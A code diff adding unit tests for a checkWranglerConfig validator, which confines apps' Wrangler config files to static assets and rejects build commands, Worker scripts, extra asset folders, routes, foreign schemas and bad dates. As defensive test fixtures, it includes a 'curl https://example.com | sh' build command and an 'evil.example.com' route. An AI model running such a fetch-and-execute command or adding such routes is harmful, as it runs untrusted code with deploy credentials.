@@ -76,6 +76,51 @@ describe("checkWranglerConfig", () => {
     );
   });
 
+  it("allows no other key, at the root or in an environment", () => {
+    // Each could run a command, start a Worker script, upload other files or add a route, with
+    // the deploy token, after CI recorded the hash of every file.
+    const build = { ...hub, build: { command: "curl https://example.com | sh" } };
+    expect(check("apps/hub/wrangler.json", build).map((v) => v.message)).toEqual([
+      "build is not allowed: apps are static assets on their own domains only (ADR 0006).",
+    ]);
+    const production = structuredClone(hub) as Record<string, unknown> & typeof hub;
+    Object.assign(production.env.production, {
+      main: "src/index.ts",
+      assets: { directory: "./other" },
+      route: "evil.example.com/*",
+    });
+    expect(check("apps/hub/wrangler.json", production).map((v) => v.message)).toEqual([
+      "Apps are static assets only; remove env.production.main (ADR 0006).",
+      "env.production.assets is not allowed: apps are static assets on their own domains only (ADR 0006).",
+      "env.production.route is not allowed: apps are static assets on their own domains only (ADR 0006).",
+    ]);
+    const route = { ...hub, route: "evil.example.com/*" };
+    expect(check("apps/hub/wrangler.json", route).map((v) => v.message)).toEqual([
+      "Routes belong in env.staging and env.production only.",
+    ]);
+  });
+
+  it("takes only Wrangler's own schema and a compatibility date", () => {
+    const schema = { ...hub, $schema: "https://example.com/schema.json" };
+    expect(check("apps/hub/wrangler.json", schema)[0]?.message).toMatch(
+      /^\$schema must be "\.\/node_modules\/wrangler\/config-schema\.json"/,
+    );
+    expect(
+      check("apps/hub/wrangler.json", {
+        ...hub,
+        $schema: "./node_modules/wrangler/config-schema.json",
+      }),
+    ).toEqual([]);
+    for (const date of ["tomorrow", 20_261_001, undefined]) {
+      expect(check("apps/hub/wrangler.json", { ...hub, compatibility_date: date })).toEqual([
+        {
+          file: "apps/hub/wrangler.json",
+          message: "compatibility_date must be a date, as 2026-10-01.",
+        },
+      ]);
+    }
+  });
+
   it("rejects other formats and invalid JSON", () => {
     expect(checkWranglerConfig("apps/hub/wrangler.toml", "")[0]?.message).toMatch(
       /Use wrangler.json/,
